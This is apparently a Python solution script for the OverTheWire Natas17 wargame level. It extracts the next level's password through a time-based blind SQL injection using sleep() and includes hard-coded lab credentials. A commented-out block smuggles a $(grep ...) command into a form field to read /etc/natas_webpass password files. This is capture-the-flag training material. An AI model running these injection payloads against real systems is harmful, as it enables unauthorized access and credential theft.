#!/usr/bin/env python
# SQL TIMED ATTACK
import requests
import re
from string import *
from time import *

characters = lowercase + uppercase + digits	
	
username='natas17'
password='8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

url = 'http://%s.natas.labs.overthewire.org/' %username
path = '/?debug=true'
session = requests.session()

seen_pass = list()

while (len(seen_pass)<32):

	for ch in characters:
		print "Trying Password: " + "".join(seen_pass) + ch
		start_time = time()
		response = session.post(url, auth=(username, password), data={'username':'natas18" and binary password like "'+ "".join(seen_pass) + ch +'%" and  sleep(2) #'})
		end_time = time()

		time_diff = end_time - start_time

		if time_diff >= 2:
			seen_pass.append(ch)
			break
		# print content

final_pass = "".join(seen_pass)
print "Password for Natas18 is: " + final_pass

# while (len(seen_pass)<32):
# 	for ch in characters:
# 		print "Trying password: " + "".join(seen_pass) + ch
# 		response = session.post(url, auth=(username, password), data = { 'needle': 'hello$(grep ^' + "".join(seen_pass) + ch +  ' /etc/natas_webpass/natas17)'})
# 		content = response.text
		
# 		if '<pre>\n</pre>' in content:
# 			seen_pass.append(ch)
# 			break
# final_pass = "".join(seen_pass)
# print "Password is: ", final_pass

# xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

#Similar to the previous one but this time there was no output being returned.
# So we added a SLEEP() clause to the query, so when all the passed subqueries turned true... output was delayed by a few seconds which we captured by time difference. And on the basis of that we guesse
